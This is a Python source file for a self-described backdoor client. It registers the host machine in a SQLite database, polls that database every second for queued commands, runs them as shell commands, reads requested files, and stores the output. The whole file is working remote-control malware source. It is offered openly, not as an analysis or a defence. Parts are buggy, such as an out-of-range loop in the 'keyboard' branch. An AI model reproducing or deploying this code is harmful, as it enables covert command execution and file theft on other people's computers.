import sqlite3,socket,os,time,datetime

class backdoor:
    def __init__(self):
        self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
        self.cursor = self.db.cursor()

        pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
        self.pc_id = None
        for pc in pcs:
            if socket.gethostbyname(socket.gethostname()) == pc[1]:
                self.pc_id = pc[0]

        if self.pc_id == None:
            sql_code = """INSERT INTO backdoor_computer
                      (ip_addr, pc_name)
                      VALUES (?, ?)
            """
            
            self.cursor.execute(sql_code, (socket.gethostbyname(socket.gethostname()),socket.gethostname()))
            self.db.commit()

            pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
            self.pc_id = None
            for pc in pcs:
                if socket.gethostbyname(socket.gethostname()) == pc[1]:
                    self.pc_id = pc[0]

        while True:
            self.command_thread()
            time.sleep(1)

    def run(self, code):
        output = ""
        commands_to_execute = code.split("\r\n")
        lines_to_skip = []
        for line, command in enumerate(commands_to_execute):
            if line in lines_to_skip: continue
            if command.startswith("read"):
                command_args = command.split(":")
                files_to_read = command_args[1].split(",")
                for file in files_to_read:
                    file = file.replace('"', '')
                    file = file.replace("'", "")
                    file = file.replace(" ", "")
                    try:
                        with open(file, "r") as r:
                            output += r.read()
                    except FileNotFoundError:
                        output += "FileNotFoundError: " + file + " does not exist\n"
            elif command.startswith("keyboard"):
                for i in range(len(commands_to_execute)):
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        print(commands_to_execute[i+line])
                    lines_to_skip.append(i+line)
            else:
                output += os.popen(command).read()

        return output
    def command_thread(self):
        commands = self.cursor.execute("SELECT * FROM backdoor_command").fetchall()
        for command in commands:
            if command[1] == self.pc_id:
                output = self.run(command[2])
                
                self.cursor.execute(f"DELETE FROM backdoor_command WHERE id={str(command[0])}")
                sql_code = """INSERT INTO backdoor_output
                      (command, output, target_id, time)                 
                      VALUES (?, ?, ?, ?)
                """
                self.cursor.execute(sql_code, (command[2], output, self.pc_id,datetime.datetime.now()))
                self.db.commit()
                
backdoor()



